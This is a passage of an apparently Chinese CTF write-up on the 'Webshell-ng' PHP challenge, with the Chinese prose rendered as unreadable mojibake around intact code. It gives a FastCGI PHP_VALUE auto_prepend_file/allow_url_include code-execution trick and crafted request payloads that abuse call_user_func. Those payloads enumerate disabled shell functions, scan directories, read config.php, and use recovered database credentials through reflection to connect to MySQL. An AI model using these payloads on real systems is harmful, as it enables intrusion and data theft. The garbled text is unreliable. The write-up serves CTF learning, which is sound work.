æ‰§è¡Œ"><span id="ä»»æ„ä»£ç æ‰§è¡Œ"> ä»»æ„ä»£ç æ‰§è¡Œ</span></h2><p>è™½ç„¶èƒ½æ§åˆ¶<code>SCRIPT_NAME</code>,ä½†æ˜¯åªèƒ½æ‰§è¡Œç›®æ ‡æœåŠ¡å™¨ä¸Šçš„phpæ–‡ä»¶,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡FastCGIå»æ§åˆ¶php.iniçš„å†…å®¹,ä¼—æ‰€å‘¨çŸ¥,php.inié‡Œé¢è§„å®šäº†phpçš„è®¸å¤šå†…å®¹,èƒ½ä¿®æ”¹æ˜¯éå¸¸å±é™©çš„.</p><p>åœ¨å­¦ä¹ æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™,æˆ‘ä»¬å°±æ¥è§¦è¿‡,<code>auto_prepend_file</code>å’Œ<code>auto_append_file</code>ã€‚</p><p>è¿™äº›å†³å®šäº†åœ¨phpè„šæœ¬æ‰§è¡Œå‰æˆ–åæ‰§è¡Œä»€ä¹ˆå†…å®¹.</p><p>å‡è®¾æˆ‘ä»¬è®¾ç½®<code>auto_prepend_file</code>ä¸º<code>php://input</code>ï¼Œé‚£ä¹ˆå°±ç­‰äºåœ¨æ‰§è¡Œä»»ä½•phpæ–‡ä»¶å‰éƒ½è¦åŒ…å«ä¸€éPOSTçš„å†…å®¹,é‚£ä¹ˆåœ¨postçš„bodyé‡Œé¢æ”¾å…¥æˆ‘ä»¬æƒ³è¦çš„æ¶æ„å†…å®¹,å°±å¯ä»¥è¢«æ‰§è¡Œäº†.</p><p>ä¸è¿‡å‘¢,è¿˜éœ€è¦<code>allow_url_include</code>å¼€å¯,ä½†æ˜¯,ä¸è¦ç´§.å› ä¸ºè¿™ä¸ªæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡php.iniå»è®¾ç½®.</p><p>ç„¶åfpmè¿˜æœ‰ä¸¤ä¸ªç¯å¢ƒå˜é‡<code>PHP_INI_USER</code> å’Œ <code>PHP_INI_ALL</code></p><p><code>PHP_INI_USER</code> å’Œ <code>PHP_INI_ALL</code> æ˜¯ PHP é…ç½®é€‰é¡¹çš„ä¸åŒä½œç”¨èŒƒå›´ï¼Œç”¨äºå®šä¹‰è¿™äº›é€‰é¡¹åœ¨ä½•æ—¶ç”Ÿæ•ˆã€‚</p><ol><li><strong><code>PHP_INI_USER</code>ï¼š</strong><ul><li>å½“è®¾ç½®ä¸º <code>PHP_INI_USER</code> æ—¶ï¼Œé…ç½®é€‰é¡¹å¯ä»¥åœ¨ç”¨æˆ·è„šæœ¬ä¸­ä½¿ç”¨ <code>ini_set</code> å‡½æ•°è¿›è¡Œæ›´æ”¹ã€‚ç”¨æˆ·å¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨ <code>ini_set</code> å‡½æ•°åŠ¨æ€åœ°ä¿®æ”¹è¿™äº›é€‰é¡¹çš„å€¼ï¼Œä½†è¿™äº›æ›´æ”¹ä»…åœ¨å½“å‰è„šæœ¬æ‰§è¡ŒæœŸé—´æœ‰æ•ˆã€‚</li><li>é€šå¸¸ç”¨äºé‚£äº›å¸Œæœ›å…è®¸ç”¨æˆ·æ ¹æ®å…¶ç‰¹å®šéœ€æ±‚è¿›è¡Œé…ç½®çš„é€‰é¡¹ã€‚</li></ul></li><li><strong><code>PHP_INI_ALL</code>ï¼š</strong><ul><li>å½“è®¾ç½®ä¸º <code>PHP_INI_ALL</code> æ—¶ï¼Œé…ç½®é€‰é¡¹å¯ä»¥åœ¨å…¨å±€èŒƒå›´å†…é€šè¿‡ PHP.ini æ–‡ä»¶ã€Apache é…ç½®æ–‡ä»¶ç­‰è¿›è¡Œè®¾ç½®ï¼Œä»¥åŠåœ¨ç”¨æˆ·è„šæœ¬ä¸­é€šè¿‡ <code>ini_set</code> è¿›è¡Œæ›´æ”¹ã€‚è¿™æ„å‘³ç€å®ƒæ—¢å¯ä»¥åœ¨å…¨å±€é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶é€šè¿‡ <code>ini_set</code> è¿›è¡Œä¿®æ”¹ã€‚</li><li>é€šå¸¸ç”¨äºé‚£äº›å¯èƒ½éœ€è¦åœ¨å…¨å±€èŒƒå›´å†…è¿›è¡Œé…ç½®çš„é€‰é¡¹ã€‚</li></ul></li></ol><p>ç„¶è€Œéƒ½æœ‰ä¸€ä¸ªç‰¹ç‚¹,å°±æ˜¯éƒ½ä¸èƒ½æ”¹diasble_function,è¿™æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: <span class="string">&#x27;/var/www/html/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: <span class="string">&#x27;/index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>: <span class="string">&#x27;/index.php?a=1&amp;b=2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: <span class="string">&#x27;/var/www/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;12345&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆè®¾è®¡ä¸€ä¸‹,<code>auto_prepend_file = php://input</code> <code>allow_url_include = On</code></p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">exp</a></p><h1 id="æºç é‰´èµä¸€æ³¢"><span id="æºç é‰´èµä¸€æ³¢"> æºç é‰´èµä¸€æ³¢</span></h1><p>ä½œä¸ºä¸€ä¸ªwebğŸ•,æºç æ˜¯æˆ‘ä»¬ä¸å¾—ä¸å“é‰´çš„ä¸€ä¸ªä¸œè¥¿.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$memory</span> = <span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$memory</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$memory</span>[<span class="string">&quot;pc&quot;</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$i</span> = &amp;<span class="variable">$memory</span>[<span class="string">&quot;pc&quot;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$memory</span>[<span class="variable">$i</span>] === <span class="string">&quot;call&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">3</span>]] = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">1</span>], <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">2</span>]]);</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">4</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$memory</span>[<span class="variable">$i</span>] === <span class="string">&quot;inst_call&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$inst</span> = <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">1</span>]];</span><br><span class="line">        <span class="variable">$method</span> = <span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">2</span>];</span><br><span class="line">        <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">4</span>]] = <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$inst</span>, <span class="variable">$method</span>], <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">3</span>]]);</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">5</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$memory</span>[<span class="variable">$i</span>] === <span class="string">&quot;new&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$class_name</span> = <span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">3</span>]] = <span class="keyword">new</span> <span class="variable">$class_name</span>(<span class="variable">$memory</span>[<span class="variable">$memory</span>[<span class="variable">$i</span> + <span class="number">2</span>]]);</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">4</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¼¼èƒ½æ‰§è¡Œä»»æ„ä»£ç ,å®é™…ä¸Šåˆ©ç”¨èµ·æ¥è¿˜æ˜¯æœ‰ä¸€å®šçš„éš¾åº¦çš„.</p><p>è¯¥ç¯å¢ƒç¦ç”¨äº†å¾ˆå¤šå‡½æ•°,è¿˜é™åˆ¶äº†openbase_dir.</p><p>è¿™é‡Œé¢æœ‰ä¸‰ä¸ªåŠŸèƒ½,ç¬¬ä¸€ä¸ªæ˜¯è°ƒç”¨ä»»æ„ä¸€ä¸ªå•å‚æ–¹æ³•.</p><p>ç¬¬äºŒä¸ªå¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„å•å‚æ–¹æ³•.</p><p>ç¬¬ä¸‰ä¸ªå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ç±».</p><p>å·¨nmæ¶å¿ƒçš„æ˜¯,phpinfoè¿˜ä¸ç»™å®Œæ•´ç‰ˆçš„,nmdä¿¡æ¯æœé›†è¿˜è¦è‡ªå·±ä¸€ä¸ªä¸ªè°ƒç”¨å‡½æ•°æ˜¯å§ğŸ˜…</p><h1 id="ä¿¡æ¯æœé›†"><span id="ä¿¡æ¯æœé›†"> ä¿¡æ¯æœé›†</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=ini_get&amp;<span class="number">2</span>=path&amp;path=disable_functions&amp;<span class="number">3</span>=result&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=var_dump&amp;<span class="number">6</span>=result</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ª,å…ˆè°ƒç”¨ini_getè·å–è®¾ç½®,å†é€šè¿‡å¾ªç¯,å°†ç»“æœæ‰“å°å‡ºæ¥.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popepassthru,pcntl_async_signals,pcntl_wifcontinued,set_time_limit,pcntl_wtermsig,system,pcntl_wexitstatus,openlog,pcntl_alarm,proc_open,mail,dl,ini_set,popen,apache_setenv,shell_exec,pcntl_strerror,ld,pcntl_get_last_error,pcntl_signal,pcntl_getpriority,chroot,pcntl_setpriority,pcntl_sigwaitinfo,pcntl_sigprocmask,syslog,putenv,pcntl_waitpid,pcntl_wait,passthru,symlink,ini_alter,chgrp,pcntl_wifsignaled,link,pcntl_wstopsig,readlink,pcntl_sigtimedwait,pcntl_exec,pcntl_signal_dispatch,exec,chown,pcntl_fork,pcntl_wifstopped,pcntl_signal_get_handler,ini_restore,error_log,pcntl_wifexited,imap_open</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=ini_get&amp;<span class="number">2</span>=path&amp;path=open_basedir&amp;<span class="number">3</span>=result&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=var_dump&amp;<span class="number">6</span>=result</span><br><span class="line"><span class="string">&quot;/var/www/html/:/tmp/&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=get_loaded_extensions&amp;<span class="number">2</span>=path&amp;path=&amp;<span class="number">3</span>=result&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=var_dump&amp;<span class="number">6</span>=result</span><br></pre></td></tr></table></figure><p>ç„¶åè·å–ä¸€äº›æ‰©å±•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">37</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;Core&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;date&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;libxml&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;openssl&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;pcre&quot;</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;sqlite3&quot;</span></span><br><span class="line">  [<span class="number">6</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;zlib&quot;</span></span><br><span class="line">  [<span class="number">7</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;ctype&quot;</span></span><br><span class="line">  [<span class="number">8</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;curl&quot;</span></span><br><span class="line">  [<span class="number">9</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;dom&quot;</span></span><br><span class="line">  [<span class="number">10</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;fileinfo&quot;</span></span><br><span class="line">  [<span class="number">11</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;filter&quot;</span></span><br><span class="line">  [<span class="number">12</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;ftp&quot;</span></span><br><span class="line">  [<span class="number">13</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;hash&quot;</span></span><br><span class="line">  [<span class="number">14</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;iconv&quot;</span></span><br><span class="line">  [<span class="number">15</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;json&quot;</span></span><br><span class="line">  [<span class="number">16</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;mbstring&quot;</span></span><br><span class="line">  [<span class="number">17</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;SPL&quot;</span></span><br><span class="line">  [<span class="number">18</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;session&quot;</span></span><br><span class="line">  [<span class="number">19</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;PDO&quot;</span></span><br><span class="line">  [<span class="number">20</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;pdo_sqlite&quot;</span></span><br><span class="line">  [<span class="number">21</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;standard&quot;</span></span><br><span class="line">  [<span class="number">22</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;posix&quot;</span></span><br><span class="line">  [<span class="number">23</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;random&quot;</span></span><br><span class="line">  [<span class="number">24</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;readline&quot;</span></span><br><span class="line">  [<span class="number">25</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;Reflection&quot;</span></span><br><span class="line">  [<span class="number">26</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;Phar&quot;</span></span><br><span class="line">  [<span class="number">27</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;SimpleXML&quot;</span></span><br><span class="line">  [<span class="number">28</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;tokenizer&quot;</span></span><br><span class="line">  [<span class="number">29</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;xml&quot;</span></span><br><span class="line">  [<span class="number">30</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;xmlreader&quot;</span></span><br><span class="line">  [<span class="number">31</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;xmlwriter&quot;</span></span><br><span class="line">  [<span class="number">32</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;mysqlnd&quot;</span></span><br><span class="line">  [<span class="number">33</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;cgi-fcgi&quot;</span></span><br><span class="line">  [<span class="number">34</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;mysqli&quot;</span></span><br><span class="line">  [<span class="number">35</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;pdo_mysql&quot;</span></span><br><span class="line">  [<span class="number">36</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;sodium&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°,æœ‰mysqli,</p><h2 id="æ‰«ç›®å½•"><span id="æ‰«ç›®å½•"> æ‰«ç›®å½•</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=<span class="keyword">new</span>&amp;<span class="number">1</span>=<span class="built_in">DirectoryIterator</span>&amp;<span class="number">2</span>=path&amp;<span class="number">3</span>=file&amp;<span class="number">4</span>=call&amp;<span class="number">5</span>=print_r&amp;<span class="number">6</span>=file&amp;path=glob:<span class="comment">///var/www/html/d*&amp;pc=0</span></span><br></pre></td></tr></table></figure><p>å‘ç°config.php,è¯»ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=call&amp;<span class="number">1</span>=highlight_file&amp;<span class="number">2</span>=file&amp;file=config.php&amp;b&amp;pc=<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701653156207(1).png" alt="1701653156207(1)"></p><p>å‘ç°æ•°æ®åº“å¯†ç ,é‚£ä¹ˆç›®å‰å°±æœ‰ä¸€ä¸ªæ€è·¯,é€šè¿‡è¿æ¥æ•°æ®åº“è¿›è¡Œä¸€äº›æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$DB_NAME</span> = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="variable">$DB_USER</span> = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="variable">$DB_PASSWORD</span> = <span class="string">&quot;web&quot;</span>;</span><br><span class="line"><span class="variable">$DB_HOST</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="è¿æ¥mysql"><span id="è¿æ¥mysql"> è¿æ¥mysql</span></h1><p>æ‰©å±•é‡Œé¢æœ‰mysqliè¿™ä¸ªç±»,é‚£ä¹ˆå¯ä»¥é€šè¿‡mysqliå»è¿æ¥æ•°æ®åº“.</p><p>ä¸è¿‡åœ¨æ­¤ä¹‹å‰è¿˜è¦è§£å†³çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯:åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹,é¢˜ç›®åªèƒ½åˆ›å»ºä¸€ä¸ªå•å‚æ•°çš„æ„é€ å‡½æ•°å¯¹è±¡,è€Œmysqliçš„è¿æ¥,èµ·ç è¦ä¸‰ä¸ªå‚æ•°.</p><p>æ€ä¹ˆåŠå‘¢?ğŸ‘´æƒ³åˆ°äº†ç”¨åå°„,åå°„çš„æ„é€ å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°,å¹¶ä¸”,åå°„åˆ›å»ºå®ä¾‹,æ”¯æŒä½¿ç”¨æ•°ç»„ä¼ é€’æ‰€æœ‰å‚æ•°,è¿™å°±å®Œç¾åœ°å¥‘åˆæˆ‘ä»¬çš„éœ€æ±‚.</p><p>å› æ­¤æ€è·¯å°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$refClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;mysqli&#x27;</span>);</span><br><span class="line"><span class="variable">$args</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;web&#x27;</span>,<span class="string">&#x27;web&#x27;</span>]</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>(<span class="variable">$args</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰§è¡Œsqlè¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    NEW ReflectionClass mysqli refClass</span></span><br><span class="line"><span class="string">    ICALL refClass newInstanceArgs mysqli_arg mysqli1</span></span><br><span class="line"><span class="string">    ICALL mysqli1 query query_arg result</span></span><br><span class="line"><span class="string">    ICALL result fetch_all res row</span></span><br><span class="line"><span class="string">    CALL var_dump row _</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œç”¨çš„åå°„åˆ›å»ºmysqli,ç”¨åå°„è°ƒç”¨connectæ–¹æ³•ä¹Ÿè¡Œ</p><p>è¯»å–æ•°æ®åº“,æ‹¿åˆ°ä¸€åŠçš„flag.</p><h1 id="è‡ªåŠ¨åŒ–è„šæœ¬"><span id="è‡ªåŠ¨åŒ–è„šæœ¬"> è‡ªåŠ¨åŒ–è„šæœ¬</span></h1><p>å‡ºé¢˜äººè¯´,è„‘ç®—é€»è¾‘å¾ˆç´¯,æ‰€ä»¥ä»–æ•´äº†ä¸ªè„šæœ¬,ä½†æ˜¯è¿™ä¸ªè„šæœ¬æ¯”è¾ƒå¤æ‚,æ‰€ä»¥æˆ‘å¸¦ç€ä½ ä»¬æ¥å“é‰´ä¸€ä¸‹.</p><p>è„šæœ¬ç”¨äº†ä¸€å †æˆ‘çœ‹ä¸æ‡‚çš„è¯­æ³•,æ…¢æ…¢å•ƒä¸€ä¸‹.</p><h2 id="ä¸»é€»è¾‘"><span id="ä¸»é€»è¾‘"> 